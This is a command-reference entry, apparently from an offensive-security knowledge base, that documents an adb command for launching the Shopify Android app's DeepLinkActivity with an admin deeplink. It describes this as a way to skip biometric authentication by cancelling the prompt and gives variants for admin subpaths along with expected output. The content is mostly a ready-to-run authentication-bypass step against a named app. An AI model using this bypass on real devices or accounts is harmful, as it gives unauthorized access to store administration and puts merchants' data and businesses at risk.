---
id: cmd-adb-deeplink-admin
data: >-
  adb shell am start -n
  com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d
  'https://shopify.com/admin/'
tags:
  - adb
  - intent
  - bypass
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.392Z'
verified: false
validated: true
submitted: true
---
# adb-start-deeplink-admin

## Command

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://shopify.com/admin/'
```

## Description

This ADB command launches the DeepLinkActivity in the Shopify Android app with a deeplink to the admin dashboard, allowing bypass via cancel on prompts when the app is closed. Demonstrates vulnerability in newer versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | Specifies the component (package/activity) | Yes |
| `-d` | Sets the data URI for the intent | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://shopify.com/admin/'
```

### Advanced Usage

Adapt for specific admin subpaths.

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://shopify.com/admin/settings'
```

## Expected Output

Starting: Intent { act=android.intent.action.VIEW cmp=com.shopify.mobile/.lib.app.DeepLinkActivity (has extras) }
App launches; after cancel, access to admin without biometrics.

## Related

- [[commands/adb-start-deeplink-products]]
- [[procedures/Bypass-Auth-on-Closed-App-via-Cancel]]
